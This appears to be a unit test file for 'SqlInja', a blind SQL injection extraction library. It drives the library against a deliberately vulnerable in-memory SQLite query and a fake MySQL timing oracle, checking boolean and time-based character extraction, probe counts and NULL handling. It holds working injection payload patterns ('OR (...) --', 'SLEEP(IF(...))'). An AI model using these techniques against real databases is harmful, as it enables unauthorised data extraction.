#!/usr/bin/env python3
"""Unit tests for SqlInja driven against a real, syntactically vulnerable
SQLite query -- no HTTP, but a genuine string-concatenation injection point"""

import builtins
import re
import sqlite3
import string
import unittest
from unittest import mock

from sqlinja import CandidateTooNarrow, SqlInja, Mode
from sqlinja import MsSqlConfig, MySqlConfig, SqliteConfig


class SqlInjaSqliteTestCase(unittest.TestCase):
    """Simulates a route built as: SELECT * FROM Users WHERE LastLoginIP = '<user input>'"""

    def setUp(self):
        self.con = sqlite3.connect(":memory:")
        self.cur = self.con.cursor()
        self.cur.execute(
            "CREATE TABLE Users(Id INTEGER PRIMARY KEY, UserName TEXT, LastLoginIP TEXT)"
        )
        self.cur.executemany(
            "INSERT INTO Users(UserName, LastLoginIP) VALUES (?, ?)",
            [("soham", "10.0.0.1"), ("admin", "10.0.0.2"), ("guest", "10.0.0.3")],
        )
        self.con.commit()
        self.helper = SqlInja(SqliteConfig(), self.exec_request, mode=Mode.BOOLEAN)
        self.candidates = string.ascii_letters + string.digits

    def tearDown(self):
        self.con.close()

    def run_vulnerable_route(self, user_input: str) -> bool:
        query = "SELECT * FROM Users WHERE LastLoginIP = '" + user_input + "'"
        row = self.cur.execute(query).fetchone()
        return row is not None

    def exec_request(self, payload: str, sleep_duration: int) -> bool:
        injected = f"nonexistent' OR ({payload}) -- "
        return self.run_vulnerable_route(injected)

    def test_check_detects_existing_row(self):
        self.assertTrue(self.helper.check("SELECT 1"))

    def test_check_detects_missing_row(self):
        self.assertFalse(
            self.helper.check("SELECT UserName FROM Users WHERE Id = 999")
        )

    def test_extract_val_reads_count(self):
        self.assertEqual(
            self.helper.extract_val("SELECT COUNT(*) FROM Users", 0, 100), 3
        )

    def test_extract_until_end_char_reads_cell(self):
        chars = list(
            self.helper.extract_until_end_char(
                "SELECT UserName FROM Users WHERE Id = 1", self.candidates
            )
        )
        self.assertEqual("".join(chars), "soham")

    def test_extract_until_end_char_raises_when_max_length_exceeded(self):
        with self.assertRaises(RuntimeError):
            list(
                self.helper.extract_until_end_char(
                    "SELECT UserName FROM Users WHERE Id = 1", self.candidates, max_length=3
                )
            )

    def test_extract_by_length_reads_cell(self):
        chars = list(
            self.helper.extract_by_length(
                "SELECT UserName FROM Users WHERE Id = 2", self.candidates
            )
        )
        self.assertEqual("".join(chars), "admin")

    def test_extract_by_length_handles_empty_value(self):
        self.cur.execute("INSERT INTO Users(UserName, LastLoginIP) VALUES ('', '10.0.0.4')")
        self.con.commit()
        chars = list(
            self.helper.extract_by_length(
                "SELECT UserName FROM Users WHERE Id = 4", self.candidates
            )
        )
        self.assertEqual(chars, [])

    def test_extract_by_length_raises_on_character_outside_candidates(self):
        # ',' sits deep in a gap, '/' immediately next to a run: both are
        # simply absent from the domain, and both must be reported as such
        for char, ip in ((",", "10.0.0.6"), ("/", "10.0.0.7")):
            with self.subTest(char=char):
                self.cur.execute(
                    "INSERT INTO Users(UserName, LastLoginIP) VALUES (?, ?)",
                    (f"a{char}b", ip),
                )
                self.con.commit()
                with self.assertRaises(CandidateTooNarrow):
                    list(
                        self.helper.extract_by_length(
                            f"SELECT UserName FROM Users WHERE LastLoginIP = '{ip}'",
                            self.candidates,
                        )
                    )

    def test_extract_column_iterates_all_rows(self):
        request_template = "SELECT UserName FROM Users ORDER BY Id {index}"
        users = [
            "".join(cell)
            for cell in self.helper.extract_column(
                request_template, self.candidates, start_index=0
            )
        ]
        self.assertEqual(users, ["soham", "admin", "guest"])

    def test_null_cell_does_not_truncate_the_column(self):
        # has_result must test the row's existence, not its value: a check
        # built on "({req}) IS NOT NULL" reads a row holding NULL as no row
        # at all, and __iter_row_requests() then stops there, dropping every
        # row past it without a warning.
        self.cur.execute(
            "INSERT INTO Users(UserName, LastLoginIP) VALUES (NULL, '10.0.0.40')"
        )
        self.cur.execute(
            "INSERT INTO Users(UserName, LastLoginIP) VALUES ('zoe', '10.0.0.41')"
        )
        self.con.commit()
        request_template = "SELECT UserName FROM Users ORDER BY Id {index}"

        rows = list(
            self.helper.extract_column_rows(
                request_template, self.candidates, start_index=0
            )
        )

        self.assertEqual(rows, ["soham", "admin", "guest", None, "zoe"])

    def test_check_is_true_for_a_row_holding_null(self):
        self.cur.execute(
            "INSERT INTO Users(UserName, LastLoginIP) VALUES (NULL, '10.0.0.42')"
        )
        self.con.commit()

        self.assertTrue(
            self.helper.check(
                "SELECT UserName FROM Users WHERE LastLoginIP = '10.0.0.42'"
            )
        )
        self.assertFalse(
            self.helper.check(
                "SELECT UserName FROM Users WHERE LastLoginIP = '10.9.9.9'"
            )
        )

    def test_extract_column_rows_iterates_all_rows(self):
        request_template = "SELECT UserName FROM Users ORDER BY Id {index}"
        users = list(
            self.helper.extract_column_rows(
                request_template, self.candidates, start_index=0
            )
        )
        self.assertEqual(users, ["soham", "admin", "guest"])

    def test_extract_column_rows_collects_safely_with_list(self):
        # unlike extract_column()'s nested generators, plain lists are safe
        # to collect up front with list()
        request_template = "SELECT UserName FROM Users ORDER BY Id {index}"
        rows = list(
            self.helper.extract_column_rows(
                request_template, self.candidates, start_index=0
            )
        )
        self.assertEqual(rows, ["soham", "admin", "guest"])

    def test_extract_column_rows_survive_deferred_consumption(self):
        # collecting extract_column()'s row generators with list() before
        # reading them must not resolve every row against the last request
        request_template = "SELECT UserName FROM Users ORDER BY Id {index}"

        rows = list(
            self.helper.extract_column(
                request_template, self.candidates, start_index=0
            )
        )
        users = ["".join(row) for row in rows]

        self.assertEqual(users, ["soham", "admin", "guest"])

    def test_extract_column_interleaved_rows_stay_independent(self):
        request_template = "SELECT UserName FROM Users ORDER BY Id {index}"

        rows = self.helper.extract_column(
            request_template, self.candidates, start_index=0
        )
        first = next(rows)
        second = next(rows)

        first_char = next(first)
        second_value = "".join(second)
        first_value = first_char + "".join(first)

        self.assertEqual(first_value, "soham")
        self.assertEqual(second_value, "admin")

    def test_extract_column_early_break_does_not_corrupt_next_run(self):
        request_template = "SELECT UserName FROM Users ORDER BY Id {index}"

        for row in self.helper.extract_column(
            request_template, self.candidates, start_index=0
        ):
            next(row)
            break

        users = [
            "".join(row)
            for row in self.helper.extract_column(
                request_template, self.candidates, start_index=0
            )
        ]
        self.assertEqual(users, ["soham", "admin", "guest"])

    def test_extract_column_rows_uses_start_with_fast_path_on_shared_prefix(self):
        # "admin" and "administrator" share a 5-char prefix: with the fast
        # path, those chars cost 1 request each instead of a full binary
        # search (~7 requests over 63 candidates).
        self.cur.execute(
            "INSERT INTO Users(UserName, LastLoginIP) VALUES ('administrator', '10.0.0.8')"
        )
        self.con.commit()
        request_template = (
            "SELECT UserName FROM Users WHERE UserName IN ('admin', 'administrator') "
            "ORDER BY UserName {index}"
        )

        request_count = 0

        cell_probes: list[tuple[str, bool]] = []

        def recording_exec_request(payload: str, sleep_duration: int) -> bool:
            nonlocal request_count
            request_count += 1
            result = self.exec_request(payload, sleep_duration)
            cell_probes.append((payload, result))
            return result

        helper = SqlInja(SqliteConfig(), recording_exec_request, mode=Mode.BOOLEAN)

        rows = helper.extract_column_rows(request_template, self.candidates, start_index=0)
        first_row = next(rows)
        request_count = 0  # reset: only count requests for the second row
        second_row = next(rows)
        self.assertEqual([first_row, second_row], ["admin", "administrator"])
        # 64 = 1 row check + 5 replayed chars (one =-probe each, which doubles
        # as the confirmation) + 9 searched chars at 6-7 probes each
        self.assertEqual(request_count, 65)

    def test_extract_by_length_uses_start_with_fast_path(self):
        # start_with="admin" matching the real value exactly: each char
        # should resolve in a single =-probe instead of a binary search
        request = "SELECT UserName FROM Users WHERE UserName = 'admin'"

        cell_probes: list[tuple[str, bool]] = []

        def recording_exec_request(payload: str, sleep_duration: int) -> bool:
            result = self.exec_request(payload, sleep_duration)
            cell_probes.append((payload, result))
            return result

        helper = SqlInja(SqliteConfig(), recording_exec_request, mode=Mode.BOOLEAN)

        start_with = "admin"
        chars = helper.extract_by_length(request, self.candidates, start_with=start_with)
        value = "".join(chars)
        self.assertEqual(value, "admin")

        char_probes = [p for p, _ in cell_probes if "SUBSTR" in p]
        self.assertEqual(len(char_probes), len(value))

    def test_injected_quote_in_candidate_does_not_break_out(self):
        self.cur.execute(
            "INSERT INTO Users(UserName, LastLoginIP) VALUES (\"o'brien\", '10.0.0.5')"
        )
        self.con.commit()
        candidates = string.ascii_letters + "'"
        chars = list(
            self.helper.extract_by_length(
                "SELECT UserName FROM Users WHERE Id = 4", candidates
            )
        )
        self.assertEqual("".join(chars), "o'brien")


    def test_confirm_char_passes_through_clean_oracle(self):
        helper = SqlInja(
            SqliteConfig(), self.exec_request, mode=Mode.BOOLEAN, confirm_char_max_retries=2
        )
        chars = list(
            helper.extract_until_end_char("SELECT UserName FROM Users WHERE Id = 1", self.candidates)
        )
        self.assertEqual("".join(chars), "soham")

    def test_confirm_char_recovers_from_one_bad_probe(self):
        # flip the first probe's answer: confirmation must catch the
        # mismatch and force a clean retry
        calls = 0

        def flaky_exec_request(payload: str, sleep_duration: int) -> bool:
            nonlocal calls
            calls += 1
            result = self.exec_request(payload, sleep_duration)
            return not result if calls == 1 else result

        helper = SqlInja(
            SqliteConfig(), flaky_exec_request, mode=Mode.BOOLEAN, confirm_char_max_retries=2
        )
        chars = list(
            helper.extract_until_end_char("SELECT UserName FROM Users WHERE Id = 1", self.candidates)
        )
        self.assertEqual("".join(chars), "soham")

    def test_check_true_when_result_row_has_a_null_value(self):
        # EXISTS(SELECT NULL ...) is TRUE in SQL: a NULL row still counts
        self.cur.execute(
            "INSERT INTO Users(UserName, LastLoginIP) VALUES (NULL, '10.0.0.9')"
        )
        self.con.commit()
        self.assertTrue(
            self.helper.check(
                "SELECT UserName FROM Users WHERE LastLoginIP = '10.0.0.9'"
            )
        )

    def test_is_null_distinguishes_null_from_empty_string(self):
        self.cur.executemany(
            "INSERT INTO Users(UserName, LastLoginIP) VALUES (?, ?)",
            [(None, "10.0.0.10"), ("", "10.0.0.13")],
        )
        self.con.commit()
        self.assertTrue(
            self.helper.is_null("SELECT UserName FROM Users WHERE LastLoginIP = '10.0.0.10'")
        )
        self.assertFalse(
            self.helper.is_null("SELECT UserName FROM Users WHERE LastLoginIP = '10.0.0.13'")
        )

    def test_extract_cell_reads_null_and_empty_string_apart(self):
        # the pair extract_by_length() cannot tell apart: both are 0 chars
        self.cur.executemany(
            "INSERT INTO Users(UserName, LastLoginIP) VALUES (?, ?)",
            [(None, "10.0.0.11"), ("", "10.0.0.14")],
        )
        self.con.commit()
        self.assertIsNone(
            self.helper.extract_cell(
                "SELECT UserName FROM Users WHERE LastLoginIP = '10.0.0.11'",
                self.candidates,
            )
        )
        self.assertEqual(
            self.helper.extract_cell(
                "SELECT UserName FROM Users WHERE LastLoginIP = '10.0.0.14'",
                self.candidates,
            ),
            "",
        )

    def test_extract_cell_reads_a_plain_value(self):
        self.assertEqual(
            self.helper.extract_cell(
                "SELECT UserName FROM Users WHERE Id = 1", self.candidates
            ),
            "soham",
        )

    def test_confirm_char_gives_up_after_max_retries(self):
        # a constantly-flipped oracle is internally consistent (not not X
        # == X), so confirmation "passes" on the wrong char every time;
        # extract_until_end_char must still fail loudly via max_length rather than spin
        def always_lying_exec_request(payload: str, sleep_duration: int) -> bool:
            return not self.exec_request(payload, sleep_duration)

        helper = SqlInja(
            SqliteConfig(), always_lying_exec_request, mode=Mode.BOOLEAN, confirm_char_max_retries=2
        )
        with self.assertRaises(RuntimeError):
            list(helper.extract_until_end_char(
                "SELECT UserName FROM Users WHERE Id = 1", self.candidates, max_length=20
            ))

    def test_extract_by_length_raises_when_value_is_longer_than_max_length(self):
        # max_length bounds the length-probing extract_val() call; a real
        # length outside [0, max_length] is unreachable, same as any other
        # out-of-bounds extract_val() case
        request = "SELECT UserName FROM Users WHERE Id = 1"  # "soham", 5 chars

        with self.assertRaises(ValueError):
            list(self.helper.extract_by_length(request, self.candidates, max_length=3))

    def test_extract_val_handles_single_value_range(self):
        self.assertEqual(self.helper.extract_val("SELECT 3", 3, 3), 3)

    def test_extract_val_does_not_enumerate_the_search_range(self):
        # extract_val() must cost ~log2(range width) probes, not walk the
        # full range up front; 1_000 is well above __resolve()'s own
        # unrelated range(max_retries + 1) bookkeeping, to avoid false positives
        WIDE_ENOUGH_TO_BE_THE_DOMAIN = 1_000
        enumerated: list[int] = []
        real_range = builtins.range

        class _WatchedRange:
            """Records any full walk of a range at least as wide as the search domain."""

            def __init__(self, *args: int) -> None:
                self._range = real_range(*args)

            def __iter__(self):
                if len(self._range) >= WIDE_ENOUGH_TO_BE_THE_DOMAIN:
                    enumerated.append(len(self._range))
                return iter(self._range)

            def __len__(self) -> int:
                return len(self._range)

            def __contains__(self, item: object) -> bool:
                return item in self._range

            def __getitem__(self, item):
                return self._range[item]

        with mock.patch.object(builtins, "range", _WatchedRange):
            value = self.helper.extract_val("SELECT COUNT(*) FROM Users", 0, 100_000)

        self.assertEqual(value, 3)
        self.assertEqual(
            enumerated, [], f"extract_val enumerated {enumerated} candidate values"
        )

    def test_extract_val_probe_count_is_logarithmic_in_range_width(self):
        # widening the range by 200x must cost a handful of extra probes
        def probe_count(max_value: int) -> tuple[int, int]:
            count = 0

            def counting_exec_request(payload: str, sleep_duration: int) -> bool:
                nonlocal count
                count += 1
                return self.exec_request(payload, sleep_duration)

            helper = SqlInja(SqliteConfig(), counting_exec_request, mode=Mode.BOOLEAN)
            value = helper.extract_val("SELECT COUNT(*) FROM Users", 0, max_value)
            return value, count

        narrow_value, narrow_probes = probe_count(100_000)
        wide_value, wide_probes = probe_count(20_000_000)

        self.assertEqual([narrow_value, wide_value], [3, 3])
        self.assertLess(narrow_probes, 32)
        self.assertLess(wide_probes, 40)

    def test_extract_until_end_char_with_start_with_longer_than_value(self):
        # a prefix longer than the real value must still terminate on end_char
        request = "SELECT UserName FROM Users WHERE Id = 2"  # "admin"
        start_with = "administrator"

        chars = list(self.helper.extract_until_end_char(request, self.candidates, start_with=start_with))

        self.assertEqual("".join(chars), "admin")

    def test_start_with_outside_candidate_domain_is_not_trusted_blindly(self):
        request = "SELECT UserName FROM Users WHERE Id = 2"  # "admin"
        # '@' (64) is not in candidates (letters + digits)
        start_with = "@dmin"

        chars = list(self.helper.extract_until_end_char(request, self.candidates, start_with=start_with))

        self.assertEqual("".join(chars), "admin")

    def test_extract_column_without_index_placeholder_fails_clearly(self):
        # str.format(index=...) silently ignores an unused kwarg, so a
        # missing '{index}' would otherwise loop forever on the same request
        request_template = "SELECT UserName FROM Users ORDER BY Id"

        with self.assertRaises(ValueError):
            list(self.helper.extract_column(
                request_template, self.candidates, start_index=0
            ))

    def test_end_char_inside_candidate_domain_is_rejected(self):
        candidates = self.candidates + chr(SqliteConfig().end_char)

        with self.assertRaises(ValueError):
            list(self.helper.extract_until_end_char(
                "SELECT UserName FROM Users WHERE Id = 1", candidates
            ))


class SqlInjaTimeModeTestCase(unittest.TestCase):
    """Mode.TIME shares every search path with Mode.BOOLEAN; only how the
    condition gets embedded differs (config.as_time instead of as_boolean).
    A fake oracle understanding the time-blind payload shape stands in for a real DB."""

    def setUp(self):
        self.config = MySqlConfig()
        self.value = "admin"
        self.candidates = string.ascii_letters + string.digits
        self.payloads: list[str] = []

    def fake_timing_oracle(self, payload: str, sleep_duration: int) -> bool:
        """Evaluate a MySQL time-blind payload as a vulnerable server would:
        the wrapped condition decides whether SLEEP() is reached."""
        self.payloads.append(payload)

        match = re.search(r"SLEEP\(IF\((.*),\d+,0\)\)", payload, re.DOTALL)
        if match is None:
            raise AssertionError(f"not a MySQL time-blind payload: {payload!r}")
        condition = match.group(1)

        return self.evaluate_condition(condition)

    def evaluate_condition(self, condition: str) -> bool:
        index_match = re.search(r"MID\(.*,(\d+),1\)", condition)
        if index_match is None:
            raise AssertionError(f"unexpected condition shape: {condition!r}")
        index = int(index_match.group(1))
        code = ord(self.value[index - 1]) if index <= len(self.value) else 0

        between = re.search(r"BETWEEN (\d+) AND (\d+)", condition)
        if between is not None:
            return int(between.group(1)) <= code <= int(between.group(2))
        equal = re.search(r"=(\d+)\)?$", condition.strip())
        if equal is not None:
            return code == int(equal.group(1))
        raise AssertionError(f"unexpected comparison: {condition!r}")

    def test_time_mode_extracts_through_as_time_payload(self):
        helper = SqlInja(
            self.config, self.fake_timing_oracle, mode=Mode.TIME, sleep_duration=2
        )
        chars = list(helper.extract_until_end_char("SELECT UserName FROM Users", self.candidates))

        self.assertEqual("".join(chars), self.value)

    def test_time_mode_payload_carries_configured_sleep_duration(self):
        helper = SqlInja(
            self.config, self.fake_timing_oracle, mode=Mode.TIME, sleep_duration=7
        )
        helper.extract_char("SELECT UserName FROM Users", self.candidates)

        self.assertTrue(self.payloads)
        for payload in self.payloads:
            self.assertIn("SLEEP(IF(", payload)
            self.assertIn(",7,0)", payload)

    def test_boolean_mode_does_not_emit_a_sleep_payload(self):
        helper = SqlInja(self.config, self.fake_timing_oracle, mode=Mode.BOOLEAN)
        with self.assertRaises(AssertionError):
            # the fake oracle rejects anything that isn't time-blind shaped
            helper.extract_char("SELECT UserName FROM Users", self.candidates)


class HasResultContractTestCase(unittest.TestCase):
    """has_result decides when a column extraction stops, so it must test
    whether the row exists -- not whether its value is non-NULL. Reading a
    NULL-valued row as "no row" truncates the column at the first NULL cell.

    The sqlite-backed tests above can't catch a regression here: SqliteConfig
    already tested existence, so only MySQL and MsSQL ever had the bug, and
    their docker tests are skipped whenever no server is reachable.
    """

    def test_has_result_tests_row_existence_not_value(self):
        for config in (MySqlConfig, MsSqlConfig, SqliteConfig):
            with self.subTest(config=config.__name__):
                fragment = config.has_result("SELECT UserName FROM Users")
                self.assertNotIn("IS NOT NULL", fragment)


class SqlInjaTimeModeGuardTestCase(unittest.TestCase):
    def test_time_mode_rejected_without_as_time_primitive(self):
        self.assertIsNone(SqliteConfig().as_time)
        with self.assertRaises(ValueError):
            SqlInja(SqliteConfig(), lambda payload, sleep_duration: True, mode=Mode.TIME)


if __name__ == "__main__":
    unittest.main()
